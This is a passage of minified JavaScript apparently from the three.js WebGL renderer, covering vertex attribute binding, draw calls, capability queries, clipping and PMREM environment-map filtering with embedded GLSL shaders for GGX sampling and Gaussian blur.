oc(2,2),new pi({name:"BackgroundMaterial",uniforms:Br(ni.background.uniforms),vertexShader:ni.background.vertexShader,fragmentShader:ni.background.fragmentShader,side:ds,depthTest:!1,depthWrite:!1,fog:!1,allowOverride:!1})),c.geometry.deleteAttribute("normal"),Object.defineProperty(c.material,"map",{get:function(){return this.uniforms.t2D.value}}),s.update(c)),c.material.uniforms.t2D.value=E,c.material.uniforms.backgroundIntensity.value=S.backgroundIntensity,c.material.toneMapped=je.getTransfer(E.colorSpace)!==it,E.matrixAutoUpdate===!0&&E.updateMatrix(),c.material.uniforms.uvTransform.value.copy(E.matrix),(d!==E||p!==E.version||f!==t.toneMapping)&&(c.material.needsUpdate=!0,d=E,p=E.version,f=t.toneMapping),c.layers.enableAll(),x.unshift(c,c.geometry,c.material,0,0,null))}function u(x,S){x.getRGB(Yo,cy(t)),i.buffers.color.setClear(Yo.r,Yo.g,Yo.b,S,a)}function v(){h!==void 0&&(h.geometry.dispose(),h.material.dispose(),h=void 0),c!==void 0&&(c.geometry.dispose(),c.material.dispose(),c=void 0)}return{getClearColor:function(){return o},setClearColor:function(x,S=1){o.set(x),l=S,u(o,l)},getClearAlpha:function(){return l},setClearAlpha:function(x){l=x,u(o,l)},render:_,addToRenderList:g,dispose:v}}function pT(t,e){const n=t.getParameter(t.MAX_VERTEX_ATTRIBS),i={},s=p(null);let r=s,a=!1;function o(M,k,H,V,W){let j=!1;const X=d(V,H,k);r!==X&&(r=X,c(r.object)),j=f(M,V,H,W),j&&y(M,V,H,W),W!==null&&e.update(W,t.ELEMENT_ARRAY_BUFFER),(j||a)&&(a=!1,S(M,k,H,V),W!==null&&t.bindBuffer(t.ELEMENT_ARRAY_BUFFER,e.get(W).buffer))}function l(){return t.createVertexArray()}function c(M){return t.bindVertexArray(M)}function h(M){return t.deleteVertexArray(M)}function d(M,k,H){const V=H.wireframe===!0;let W=i[M.id];W===void 0&&(W={},i[M.id]=W);let j=W[k.id];j===void 0&&(j={},W[k.id]=j);let X=j[V];return X===void 0&&(X=p(l()),j[V]=X),X}function p(M){const k=[],H=[],V=[];for(let W=0;W<n;W++)k[W]=0,H[W]=0,V[W]=0;return{geometry:null,program:null,wireframe:!1,newAttributes:k,enabledAttributes:H,attributeDivisors:V,object:M,attributes:{},index:null}}function f(M,k,H,V){const W=r.attributes,j=k.attributes;let X=0;const D=H.getAttributes();for(const N in D)if(D[N].location>=0){const B=W[N];let J=j[N];if(J===void 0&&(N==="instanceMatrix"&&M.instanceMatrix&&(J=M.instanceMatrix),N==="instanceColor"&&M.instanceColor&&(J=M.instanceColor)),B===void 0||B.attribute!==J||J&&B.data!==J.data)return!0;X++}return r.attributesNum!==X||r.index!==V}function y(M,k,H,V){const W={},j=k.attributes;let X=0;const D=H.getAttributes();for(const N in D)if(D[N].location>=0){let B=j[N];B===void 0&&(N==="instanceMatrix"&&M.instanceMatrix&&(B=M.instanceMatrix),N==="instanceColor"&&M.instanceColor&&(B=M.instanceColor));const J={};J.attribute=B,B&&B.data&&(J.data=B.data),W[N]=J,X++}r.attributes=W,r.attributesNum=X,r.index=V}function _(){const M=r.newAttributes;for(let k=0,H=M.length;k<H;k++)M[k]=0}function g(M){u(M,0)}function u(M,k){const H=r.newAttributes,V=r.enabledAttributes,W=r.attributeDivisors;H[M]=1,V[M]===0&&(t.enableVertexAttribArray(M),V[M]=1),W[M]!==k&&(t.vertexAttribDivisor(M,k),W[M]=k)}function v(){const M=r.newAttributes,k=r.enabledAttributes;for(let H=0,V=k.length;H<V;H++)k[H]!==M[H]&&(t.disableVertexAttribArray(H),k[H]=0)}function x(M,k,H,V,W,j,X){X===!0?t.vertexAttribIPointer(M,k,H,W,j):t.vertexAttribPointer(M,k,H,V,W,j)}function S(M,k,H,V){_();const W=V.attributes,j=H.getAttributes(),X=k.defaultAttributeValues;for(const D in j){const N=j[D];if(N.location>=0){let O=W[D];if(O===void 0&&(D==="instanceMatrix"&&M.instanceMatrix&&(O=M.instanceMatrix),D==="instanceColor"&&M.instanceColor&&(O=M.instanceColor)),O!==void 0){const B=O.normalized,J=O.itemSize,oe=e.get(O);if(oe===void 0)continue;const ge=oe.buffer,ze=oe.type,Ye=oe.bytesPerElement,Z=ze===t.INT||ze===t.UNSIGNED_INT||O.gpuType===pp;if(O.isInterleavedBufferAttribute){const ne=O.data,_e=ne.stride,De=O.offset;if(ne.isInstancedInterleavedBuffer){for(let we=0;we<N.locationSize;we++)u(N.location+we,ne.meshPerAttribute);M.isInstancedMesh!==!0&&V._maxInstanceCount===void 0&&(V._maxInstanceCount=ne.meshPerAttribute*ne.count)}else for(let we=0;we<N.locationSize;we++)g(N.location+we);t.bindBuffer(t.ARRAY_BUFFER,ge);for(let we=0;we<N.locationSize;we++)x(N.location+we,J/N.locationSize,ze,B,_e*Ye,(De+J/N.locationSize*we)*Ye,Z)}else{if(O.isInstancedBufferAttribute){for(let ne=0;ne<N.locationSize;ne++)u(N.location+ne,O.meshPerAttribute);M.isInstancedMesh!==!0&&V._maxInstanceCount===void 0&&(V._maxInstanceCount=O.meshPerAttribute*O.count)}else for(let ne=0;ne<N.locationSize;ne++)g(N.location+ne);t.bindBuffer(t.ARRAY_BUFFER,ge);for(let ne=0;ne<N.locationSize;ne++)x(N.location+ne,J/N.locationSize,ze,B,J*Ye,J/N.locationSize*ne*Ye,Z)}}else if(X!==void 0){const B=X[D];if(B!==void 0)switch(B.length){case 2:t.vertexAttrib2fv(N.location,B);break;case 3:t.vertexAttrib3fv(N.location,B);break;case 4:t.vertexAttrib4fv(N.location,B);break;default:t.vertexAttrib1fv(N.location,B)}}}}v()}function E(){L();for(const M in i){const k=i[M];for(const H in k){const V=k[H];for(const W in V)h(V[W].object),delete V[W];delete k[H]}delete i[M]}}function A(M){if(i[M.id]===void 0)return;const k=i[M.id];for(const H in k){const V=k[H];for(const W in V)h(V[W].object),delete V[W];delete k[H]}delete i[M.id]}function C(M){for(const k in i){const H=i[k];if(H[M.id]===void 0)continue;const V=H[M.id];for(const W in V)h(V[W].object),delete V[W];delete H[M.id]}}function L(){w(),a=!0,r!==s&&(r=s,c(r.object))}function w(){s.geometry=null,s.program=null,s.wireframe=!1}return{setup:o,reset:L,resetDefaultState:w,dispose:E,releaseStatesOfGeometry:A,releaseStatesOfProgram:C,initAttributes:_,enableAttribute:g,disableUnusedAttributes:v}}function fT(t,e,n){let i;function s(c){i=c}function r(c,h){t.drawArrays(i,c,h),n.update(h,i,1)}function a(c,h,d){d!==0&&(t.drawArraysInstanced(i,c,h,d),n.update(h,i,d))}function o(c,h,d){if(d===0)return;e.get("WEBGL_multi_draw").multiDrawArraysWEBGL(i,c,0,h,0,d);let f=0;for(let y=0;y<d;y++)f+=h[y];n.update(f,i,1)}function l(c,h,d,p){if(d===0)return;const f=e.get("WEBGL_multi_draw");if(f===null)for(let y=0;y<c.length;y++)a(c[y],h[y],p[y]);else{f.multiDrawArraysInstancedWEBGL(i,c,0,h,0,p,0,d);let y=0;for(let _=0;_<d;_++)y+=h[_]*p[_];n.update(y,i,1)}}this.setMode=s,this.render=r,this.renderInstances=a,this.renderMultiDraw=o,this.renderMultiDrawInstances=l}function mT(t,e,n,i){let s;function r(){if(s!==void 0)return s;if(e.has("EXT_texture_filter_anisotropic")===!0){const C=e.get("EXT_texture_filter_anisotropic");s=t.getParameter(C.MAX_TEXTURE_MAX_ANISOTROPY_EXT)}else s=0;return s}function a(C){return!(C!==qn&&i.convert(C)!==t.getParameter(t.IMPLEMENTATION_COLOR_READ_FORMAT))}function o(C){const L=C===Ii&&(e.has("EXT_color_buffer_half_float")||e.has("EXT_color_buffer_float"));return!(C!==_n&&i.convert(C)!==t.getParameter(t.IMPLEMENTATION_COLOR_READ_TYPE)&&C!==si&&!L)}function l(C){if(C==="highp"){if(t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.HIGH_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.HIGH_FLOAT).precision>0)return"highp";C="mediump"}return C==="mediump"&&t.getShaderPrecisionFormat(t.VERTEX_SHADER,t.MEDIUM_FLOAT).precision>0&&t.getShaderPrecisionFormat(t.FRAGMENT_SHADER,t.MEDIUM_FLOAT).precision>0?"mediump":"lowp"}let c=n.precision!==void 0?n.precision:"highp";const h=l(c);h!==c&&(Ie("WebGLRenderer:",c,"not supported, using",h,"instead."),c=h);const d=n.logarithmicDepthBuffer===!0,p=n.reversedDepthBuffer===!0&&e.has("EXT_clip_control"),f=t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS),y=t.getParameter(t.MAX_VERTEX_TEXTURE_IMAGE_UNITS),_=t.getParameter(t.MAX_TEXTURE_SIZE),g=t.getParameter(t.MAX_CUBE_MAP_TEXTURE_SIZE),u=t.getParameter(t.MAX_VERTEX_ATTRIBS),v=t.getParameter(t.MAX_VERTEX_UNIFORM_VECTORS),x=t.getParameter(t.MAX_VARYING_VECTORS),S=t.getParameter(t.MAX_FRAGMENT_UNIFORM_VECTORS),E=t.getParameter(t.MAX_SAMPLES),A=t.getParameter(t.SAMPLES);return{isWebGL2:!0,getMaxAnisotropy:r,getMaxPrecision:l,textureFormatReadable:a,textureTypeReadable:o,precision:c,logarithmicDepthBuffer:d,reversedDepthBuffer:p,maxTextures:f,maxVertexTextures:y,maxTextureSize:_,maxCubemapSize:g,maxAttributes:u,maxVertexUniforms:v,maxVaryings:x,maxFragmentUniforms:S,maxSamples:E,samples:A}}function gT(t){const e=this;let n=null,i=0,s=!1,r=!1;const a=new Ts,o=new Ue,l={value:null,needsUpdate:!1};this.uniform=l,this.numPlanes=0,this.numIntersection=0,this.init=function(d,p){const f=d.length!==0||p||i!==0||s;return s=p,i=d.length,f},this.beginShadows=function(){r=!0,h(null)},this.endShadows=function(){r=!1},this.setGlobalState=function(d,p){n=h(d,p,0)},this.setState=function(d,p,f){const y=d.clippingPlanes,_=d.clipIntersection,g=d.clipShadows,u=t.get(d);if(!s||y===null||y.length===0||r&&!g)r?h(null):c();else{const v=r?0:i,x=v*4;let S=u.clippingState||null;l.value=S,S=h(y,p,x,f);for(let E=0;E!==x;++E)S[E]=n[E];u.clippingState=S,this.numIntersection=_?this.numPlanes:0,this.numPlanes+=v}};function c(){l.value!==n&&(l.value=n,l.needsUpdate=i>0),e.numPlanes=i,e.numIntersection=0}function h(d,p,f,y){const _=d!==null?d.length:0;let g=null;if(_!==0){if(g=l.value,y!==!0||g===null){const u=f+_*4,v=p.matrixWorldInverse;o.getNormalMatrix(v),(g===null||g.length<u)&&(g=new Float32Array(u));for(let x=0,S=f;x!==_;++x,S+=4)a.copy(d[x]).applyMatrix4(v,o),a.normal.toArray(g,S),g[S+3]=a.constant}l.value=g,l.needsUpdate=!0}return e.numPlanes=_,e.numIntersection=0,g}}function vT(t){let e=new WeakMap;function n(a,o){return o===Ld?a.mapping=Vs:o===Pd&&(a.mapping=Ur),a}function i(a){if(a&&a.isTexture){const o=a.mapping;if(o===Ld||o===Pd)if(e.has(a)){const l=e.get(a).texture;return n(l,a.mapping)}else{const l=a.image;if(l&&l.height>0){const c=new hy(l.height);return c.fromEquirectangularTexture(t,a),e.set(a,c),a.addEventListener("dispose",s),n(c.texture,a.mapping)}else return null}}return a}function s(a){const o=a.target;o.removeEventListener("dispose",s);const l=e.get(o);l!==void 0&&(e.delete(o),l.dispose())}function r(){e=new WeakMap}return{get:i,dispose:r}}const Qi=4,Om=[.125,.215,.35,.446,.526,.582],Cs=20,yT=256,oa=new Ap,Fm=new Xe;let xu=null,_u=0,bu=0,Su=!1;const xT=new G;class Bm{constructor(e){this._renderer=e,this._pingPongRenderTarget=null,this._lodMax=0,this._cubeSize=0,this._sizeLods=[],this._sigmas=[],this._lodMeshes=[],this._backgroundBox=null,this._cubemapMaterial=null,this._equirectMaterial=null,this._blurMaterial=null,this._ggxMaterial=null}fromScene(e,n=0,i=.1,s=100,r={}){const{size:a=256,position:o=xT}=r;xu=this._renderer.getRenderTarget(),_u=this._renderer.getActiveCubeFace(),bu=this._renderer.getActiveMipmapLevel(),Su=this._renderer.xr.enabled,this._renderer.xr.enabled=!1,this._setSize(a);const l=this._allocateTargets();return l.depthBuffer=!0,this._sceneToCubeUV(e,i,s,l,o),n>0&&this._blur(l,0,0,n),this._applyPMREM(l),this._cleanup(l),l}fromEquirectangular(e,n=null){return this._fromTexture(e,n)}fromCubemap(e,n=null){return this._fromTexture(e,n)}compileCubemapShader(){this._cubemapMaterial===null&&(this._cubemapMaterial=Hm(),this._compileMaterial(this._cubemapMaterial))}compileEquirectangularShader(){this._equirectMaterial===null&&(this._equirectMaterial=Vm(),this._compileMaterial(this._equirectMaterial))}dispose(){this._dispose(),this._cubemapMaterial!==null&&this._cubemapMaterial.dispose(),this._equirectMaterial!==null&&this._equirectMaterial.dispose(),this._backgroundBox!==null&&(this._backgroundBox.geometry.dispose(),this._backgroundBox.material.dispose())}_setSize(e){this._lodMax=Math.floor(Math.log2(e)),this._cubeSize=Math.pow(2,this._lodMax)}_dispose(){this._blurMaterial!==null&&this._blurMaterial.dispose(),this._ggxMaterial!==null&&this._ggxMaterial.dispose(),this._pingPongRenderTarget!==null&&this._pingPongRenderTarget.dispose();for(let e=0;e<this._lodMeshes.length;e++)this._lodMeshes[e].geometry.dispose()}_cleanup(e){this._renderer.setRenderTarget(xu,_u,bu),this._renderer.xr.enabled=Su,e.scissorTest=!1,ar(e,0,0,e.width,e.height)}_fromTexture(e,n){e.mapping===Vs||e.mapping===Ur?this._setSize(e.image.length===0?16:e.image[0].width||e.image[0].image.width):this._setSize(e.image.width/4),xu=this._renderer.getRenderTarget(),_u=this._renderer.getActiveCubeFace(),bu=this._renderer.getActiveMipmapLevel(),Su=this._renderer.xr.enabled,this._renderer.xr.enabled=!1;const i=n||this._allocateTargets();return this._textureToCubeUV(e,i),this._applyPMREM(i),this._cleanup(i),i}_allocateTargets(){const e=3*Math.max(this._cubeSize,112),n=4*this._cubeSize,i={magFilter:qt,minFilter:qt,generateMipmaps:!1,type:Ii,format:qn,colorSpace:Fr,depthBuffer:!1},s=zm(e,n,i);if(this._pingPongRenderTarget===null||this._pingPongRenderTarget.width!==e||this._pingPongRenderTarget.height!==n){this._pingPongRenderTarget!==null&&this._dispose(),this._pingPongRenderTarget=zm(e,n,i);const{_lodMax:r}=this;({lodMeshes:this._lodMeshes,sizeLods:this._sizeLods,sigmas:this._sigmas}=_T(r)),this._blurMaterial=ST(r,e,n),this._ggxMaterial=bT(r,e,n)}return s}_compileMaterial(e){const n=new In(new Zn,e);this._renderer.compile(n,oa)}_sceneToCubeUV(e,n,i,s,r){const l=new xn(90,1,n,i),c=[1,-1,1,1,1,1],h=[1,1,1,-1,-1,-1],d=this._renderer,p=d.autoClear,f=d.toneMapping;d.getClearColor(Fm),d.toneMapping=li,d.autoClear=!1,d.state.buffers.depth.getReversed()&&(d.setRenderTarget(s),d.clearDepth(),d.setRenderTarget(null)),this._backgroundBox===null&&(this._backgroundBox=new In(new oo,new wp({name:"PMREM.Background",side:pn,depthWrite:!1,depthTest:!1})));const _=this._backgroundBox,g=_.material;let u=!1;const v=e.background;v?v.isColor&&(g.color.copy(v),e.background=null,u=!0):(g.color.copy(Fm),u=!0);for(let x=0;x<6;x++){const S=x%3;S===0?(l.up.set(0,c[x],0),l.position.set(r.x,r.y,r.z),l.lookAt(r.x+h[x],r.y,r.z)):S===1?(l.up.set(0,0,c[x]),l.position.set(r.x,r.y,r.z),l.lookAt(r.x,r.y+h[x],r.z)):(l.up.set(0,c[x],0),l.position.set(r.x,r.y,r.z),l.lookAt(r.x,r.y,r.z+h[x]));const E=this._cubeSize;ar(s,S*E,x>2?E:0,E,E),d.setRenderTarget(s),u&&d.render(_,l),d.render(e,l)}d.toneMapping=f,d.autoClear=p,e.background=v}_textureToCubeUV(e,n){const i=this._renderer,s=e.mapping===Vs||e.mapping===Ur;s?(this._cubemapMaterial===null&&(this._cubemapMaterial=Hm()),this._cubemapMaterial.uniforms.flipEnvMap.value=e.isRenderTargetTexture===!1?-1:1):this._equirectMaterial===null&&(this._equirectMaterial=Vm());const r=s?this._cubemapMaterial:this._equirectMaterial,a=this._lodMeshes[0];a.material=r;const o=r.uniforms;o.envMap.value=e;const l=this._cubeSize;ar(n,0,0,3*l,2*l),i.setRenderTarget(n),i.render(a,oa)}_applyPMREM(e){const n=this._renderer,i=n.autoClear;n.autoClear=!1;const s=this._lodMeshes.length;for(let r=1;r<s;r++)this._applyGGXFilter(e,r-1,r);n.autoClear=i}_applyGGXFilter(e,n,i){const s=this._renderer,r=this._pingPongRenderTarget,a=this._ggxMaterial,o=this._lodMeshes[i];o.material=a;const l=a.uniforms,c=i/(this._lodMeshes.length-1),h=n/(this._lodMeshes.length-1),d=Math.sqrt(c*c-h*h),p=0+c*1.25,f=d*p,{_lodMax:y}=this,_=this._sizeLods[i],g=3*_*(i>y-Qi?i-y+Qi:0),u=4*(this._cubeSize-_);l.envMap.value=e.texture,l.roughness.value=f,l.mipInt.value=y-n,ar(r,g,u,3*_,2*_),s.setRenderTarget(r),s.render(o,oa),l.envMap.value=r.texture,l.roughness.value=0,l.mipInt.value=y-i,ar(e,g,u,3*_,2*_),s.setRenderTarget(e),s.render(o,oa)}_blur(e,n,i,s,r){const a=this._pingPongRenderTarget;this._halfBlur(e,a,n,i,s,"latitudinal",r),this._halfBlur(a,e,i,i,s,"longitudinal",r)}_halfBlur(e,n,i,s,r,a,o){const l=this._renderer,c=this._blurMaterial;a!=="latitudinal"&&a!=="longitudinal"&&Ze("blur direction must be either latitudinal or longitudinal!");const h=3,d=this._lodMeshes[s];d.material=c;const p=c.uniforms,f=this._sizeLods[i]-1,y=isFinite(r)?Math.PI/(2*f):2*Math.PI/(2*Cs-1),_=r/y,g=isFinite(r)?1+Math.floor(h*_):Cs;g>Cs&&Ie(`sigmaRadians, ${r}, is too large and will clip, as it requested ${g} samples when the maximum is set to ${Cs}`);const u=[];let v=0;for(let C=0;C<Cs;++C){const L=C/_,w=Math.exp(-L*L/2);u.push(w),C===0?v+=w:C<g&&(v+=2*w)}for(let C=0;C<u.length;C++)u[C]=u[C]/v;p.envMap.value=e.texture,p.samples.value=g,p.weights.value=u,p.latitudinal.value=a==="latitudinal",o&&(p.poleAxis.value=o);const{_lodMax:x}=this;p.dTheta.value=y,p.mipInt.value=x-i;const S=this._sizeLods[s],E=3*S*(s>x-Qi?s-x+Qi:0),A=4*(this._cubeSize-S);ar(n,E,A,3*S,2*S),l.setRenderTarget(n),l.render(d,oa)}}function _T(t){const e=[],n=[],i=[];let s=t;const r=t-Qi+1+Om.length;for(let a=0;a<r;a++){const o=Math.pow(2,s);e.push(o);let l=1/o;a>t-Qi?l=Om[a-t+Qi-1]:a===0&&(l=0),n.push(l);const c=1/(o-2),h=-c,d=1+c,p=[h,h,d,h,d,d,h,h,d,d,h,d],f=6,y=6,_=3,g=2,u=1,v=new Float32Array(_*y*f),x=new Float32Array(g*y*f),S=new Float32Array(u*y*f);for(let A=0;A<f;A++){const C=A%3*2/3-1,L=A>2?0:-1,w=[C,L,0,C+2/3,L,0,C+2/3,L+1,0,C,L,0,C+2/3,L+1,0,C,L+1,0];v.set(w,_*y*A),x.set(p,g*y*A);const M=[A,A,A,A,A,A];S.set(M,u*y*A)}const E=new Zn;E.setAttribute("position",new ui(v,_)),E.setAttribute("uv",new ui(x,g)),E.setAttribute("faceIndex",new ui(S,u)),i.push(new In(E,null)),s>Qi&&s--}return{lodMeshes:i,sizeLods:e,sigmas:n}}function zm(t,e,n){const i=new ci(t,e,n);return i.texture.mapping=ac,i.texture.name="PMREM.cubeUv",i.scissorTest=!0,i}function ar(t,e,n,i,s){t.viewport.set(e,n,i,s),t.scissor.set(e,n,i,s)}function bT(t,e,n){return new pi({name:"PMREMGGXConvolution",defines:{GGX_SAMPLES:yT,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/n,CUBEUV_MAX_MIP:`${t}.0`},uniforms:{envMap:{value:null},roughness:{value:0},mipInt:{value:0}},vertexShader:lc(),fragmentShader:`

			precision highp float;
			precision highp int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform float roughness;
			uniform float mipInt;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			#define PI 3.14159265359

			// Van der Corput radical inverse
			float radicalInverse_VdC(uint bits) {
				bits = (bits << 16u) | (bits >> 16u);
				bits = ((bits & 0x55555555u) << 1u) | ((bits & 0xAAAAAAAAu) >> 1u);
				bits = ((bits & 0x33333333u) << 2u) | ((bits & 0xCCCCCCCCu) >> 2u);
				bits = ((bits & 0x0F0F0F0Fu) << 4u) | ((bits & 0xF0F0F0F0u) >> 4u);
				bits = ((bits & 0x00FF00FFu) << 8u) | ((bits & 0xFF00FF00u) >> 8u);
				return float(bits) * 2.3283064365386963e-10; // / 0x100000000
			}

			// Hammersley sequence
			vec2 hammersley(uint i, uint N) {
				return vec2(float(i) / float(N), radicalInverse_VdC(i));
			}

			// GGX VNDF importance sampling (Eric Heitz 2018)
			// "Sampling the GGX Distribution of Visible Normals"
			// https://jcgt.org/published/0007/04/01/
			vec3 importanceSampleGGX_VNDF(vec2 Xi, vec3 V, float roughness) {
				float alpha = roughness * roughness;

				// Section 3.2: Transform view direction to hemisphere configuration
				vec3 Vh = normalize(vec3(alpha * V.x, alpha * V.y, V.z));

				// Section 4.1: Orthonormal basis
				float lensq = Vh.x * Vh.x + Vh.y * Vh.y;
				vec3 T1 = lensq > 0.0 ? vec3(-Vh.y, Vh.x, 0.0) / sqrt(lensq) : vec3(1.0, 0.0, 0.0);
				vec3 T2 = cross(Vh, T1);

				// Section 4.2: Parameterization of projected area
				float r = sqrt(Xi.x);
				float phi = 2.0 * PI * Xi.y;
				float t1 = r * cos(phi);
				float t2 = r * sin(phi);
				float s = 0.5 * (1.0 + Vh.z);
				t2 = (1.0 - s) * sqrt(1.0 - t1 * t1) + s * t2;

				// Section 4.3: Reprojection onto hemisphere
				vec3 Nh = t1 * T1 + t2 * T2 + sqrt(max(0.0, 1.0 - t1 * t1 - t2 * t2)) * Vh;

				// Section 3.4: Transform back to ellipsoid configuration
				return normalize(vec3(alpha * Nh.x, alpha * Nh.y, max(0.0, Nh.z)));
			}

			void main() {
				vec3 N = normalize(vOutputDirection);
				vec3 V = N; // Assume view direction equals normal for pre-filtering

				vec3 prefilteredColor = vec3(0.0);
				float totalWeight = 0.0;

				// For very low roughness, just sample the environment directly
				if (roughness < 0.001) {
					gl_FragColor = vec4(bilinearCubeUV(envMap, N, mipInt), 1.0);
					return;
				}

				// Tangent space basis for VNDF sampling
				vec3 up = abs(N.z) < 0.999 ? vec3(0.0, 0.0, 1.0) : vec3(1.0, 0.0, 0.0);
				vec3 tangent = normalize(cross(up, N));
				vec3 bitangent = cross(N, tangent);

				for(uint i = 0u; i < uint(GGX_SAMPLES); i++) {
					vec2 Xi = hammersley(i, uint(GGX_SAMPLES));

					// For PMREM, V = N, so in tangent space V is always (0, 0, 1)
					vec3 H_tangent = importanceSampleGGX_VNDF(Xi, vec3(0.0, 0.0, 1.0), roughness);

					// Transform H back to world space
					vec3 H = normalize(tangent * H_tangent.x + bitangent * H_tangent.y + N * H_tangent.z);
					vec3 L = normalize(2.0 * dot(V, H) * H - V);

					float NdotL = max(dot(N, L), 0.0);

					if(NdotL > 0.0) {
						// Sample environment at fixed mip level
						// VNDF importance sampling handles the distribution filtering
						vec3 sampleColor = bilinearCubeUV(envMap, L, mipInt);

						// Weight by NdotL for the split-sum approximation
						// VNDF PDF naturally accounts for the visible microfacet distribution
						prefilteredColor += sampleColor * NdotL;
						totalWeight += NdotL;
					}
				}

				if (totalWeight > 0.0) {
					prefilteredColor = prefilteredColor / totalWeight;
				}

				gl_FragColor = vec4(prefilteredColor, 1.0);
			}
		`,blending:Ci,depthTest:!1,depthWrite:!1})}function ST(t,e,n){const i=new Float32Array(Cs),s=new G(0,1,0);return new pi({name:"SphericalGaussianBlur",defines:{n:Cs,CUBEUV_TEXEL_WIDTH:1/e,CUBEUV_TEXEL_HEIGHT:1/n,CUBEUV_MAX_MIP:`${t}.0`},uniforms:{envMap:{value:null},samples:{value:1},weights:{value:i},latitudinal:{value:!1},dTheta:{value:0},mipInt:{value:0},poleAxis:{value:s}},vertexShader:lc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;
			uniform int samples;
			uniform float weights[ n ];
			uniform bool latitudinal;
			uniform float dTheta;
			uniform float mipInt;
			uniform vec3 poleAxis;

			#define ENVMAP_TYPE_CUBE_UV
			#include <cube_uv_reflection_fragment>

			vec3 getSample( float theta, vec3 axis ) {

				float cosTheta = cos( theta );
				// Rodrigues' axis-angle rotation
				vec3 sampleDirection = vOutputDirection * cosTheta
					+ cross( axis, vOutputDirection ) * sin( theta )
					+ axis * dot( axis, vOutputDirection ) * ( 1.0 - cosTheta );

				return bilinearCubeUV( envMap, sampleDirection, mipInt );

			}

			void main() {

				vec3 axis = latitudinal ? poleAxis : cross( poleAxis, vOutputDirection );

				if ( all( equal( axis, vec3( 0.0 ) ) ) ) {

					axis = vec3( vOutputDirection.z, 0.0, - vOutputDirection.x );

				}

				axis = normalize( axis );

				gl_FragColor = vec4( 0.0, 0.0, 0.0, 1.0 );
				gl_FragColor.rgb += weights[ 0 ] * getSample( 0.0, axis );

				for ( int i = 1; i < n; i++ ) {

					if ( i >= samples ) {

						break;

					}

					float theta = dTheta * float( i );
					gl_FragColor.rgb += weights[ i ] * getSample( -1.0 * theta, axis );
					gl_FragColor.rgb += weights[ i ] * getSample( theta, axis );

				}

			}
		`,blending:Ci,depthTest:!1,depthWrite:!1})}function Vm(){return new pi({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:lc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			varying vec3 vOutputDirection;

			uniform sampler2D envMap;

			#include <common>

			void main() {

				vec3 outputDirection = normalize( vOutputDirection );
				vec2 uv = equirectUv( outputDirection );

				gl_FragColor = vec4( texture2D ( envMap, uv ).rgb, 1.0 );

			}
		`,blending:Ci,depthTest:!1,depthWrite:!1})}function Hm(){return new pi({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:lc(),fragmentShader:`

			precision mediump float;
			precision mediump int;

			uniform float flipEnvMap;

			varying vec3 vOutputDirection;

			uniform samplerCube envMap;

			void main() {

				gl_FragColor = textureCube( envMap, vec3( flipEnvMap * vOutputDirection.x, vOutputDirection.yz ) );

			}
		`,blending:Ci,depthTest:!1,depthWrite:!1})}function lc(){return`

		precision mediump float;
		precision mediump int;

		attribute float faceIndex;

		varying vec3 vOutputDirection;

		// RH coordinate system; PMREM face-indexing convention
		vec3 getDirection( vec2 uv, float face ) {

			uv = 2.0 * uv - 1.0;

			vec3 direction = vec3( uv, 1.0 );

			if ( face == 0.0 ) {

				direction = direction.zyx; // ( 1, v, u ) pos x

			} else if ( face == 1.0 ) {

				direction = direction.xzy;
				direction.xz *= -1.0; // ( -u, 1, -v ) pos y

			} else if ( face == 2.0 ) {

				direction.x *= -1.0; // ( -u, v, 1 ) pos z

			} else if ( face == 3.0 ) {

				direction = direction.zyx;
				direction.xz *= -1.0; // ( -1, v, -u ) neg x

			} else if ( face == 4.0 ) {

				direction = direction.xzy;
				direction.xy *= -1.0; // ( -u, -1, v ) neg y

			} else if ( face == 5.0 ) {

				direction.z *= -1.0; // ( u, v, -1 ) neg z

			}

			return direction;

		}

		void main() {

			vOutputDirection = getDirection( uv, faceIndex );
			gl_Position = vec4( position, 1.0 );

		}
	`}function wT(t){let e=new WeakMap,n=null;function i(o){if(o&&o.isTexture){const l=o.mapping,c=l===Ld||l===Pd,h=l===Vs||l===Ur;if(c||h){let d=e.get(o);const p=d!==void 0?d.texture.pmremVersion:0;if(o.isRenderTargetTexture&&o.pmremVersion!==p)return n===null&&(n=new Bm(t)),d=c?n.fromEquirectangular(o,d):n.fromCubemap(o,d),d.texture.pmremVersion=o.pmremVersion,e.set(o,d),d.texture;if(d!==void 0)return d.texture;{const f=o.image;return c&&f&&f.height>0||h&&f&&s(f)?(n===null&&(n=new Bm(t)),d=c?n.fromEquirectangular(o):n.fromCubemap(o),d.texture.pmremVersion=o.pmremVersion,e.set(o,d),o.addEventListener("dispose",r),d.texture):null}}}return o}function s(o){let l=0;const c=6;for(let h=0;h<c;h++)o[h]!==void 0&&l++;return l===c}function r(o){const l=o.target;l.removeEventListener("dispose",r);const c=e.get(l);c!==void 0&&(e.delete(l),c.dispose())}function a(){e=new WeakMap,n!==null&&(n.dispose(),n=null)}return{get:i,dispose:a}}function MT(t){const e={};function n(i){if(e[i]!==void 0)return e[i];const s=t.getExtension(i);return e[i]=s,s}return{has:function(i){return n(i)!==null},init:function(){n("EXT_color_buffer_float"),n("WEBGL_clip_cull_distance"),n("OES_texture_float_linear"),n("EXT_color_buffer_half_float"),n("WEBGL_multisampled_render_to_texture"),n("WEBGL_render_shared_exponent")},get:function(i){const s=n(i);return s===null&&Ya("WebGLRenderer: "+i+" extension not supported."),s}}}function ET(t,e,n,i){const s={},r=new WeakMap;function a(d){const p=d.target;p.index!==null&&e.remove(p.index);for(const y in p.attributes)e.remove(p.attributes[y]);p.removeEventListener("dispose",a),delete s[p.id];const f=r.get(p);f&&(e.remove(f),r.delete(p)),i.releaseStatesOfGeometry(p),p.isInstancedBufferGeometry===!0&&delete p._maxInstanceCount,n.memory.geometries--}function o(d,p){return s[p.id]===!0||(p.addEventListener("dispose",a),s[p.id]=!0,n.memory.geometries++),p}function l(d){const p=d.attributes;for(const f in 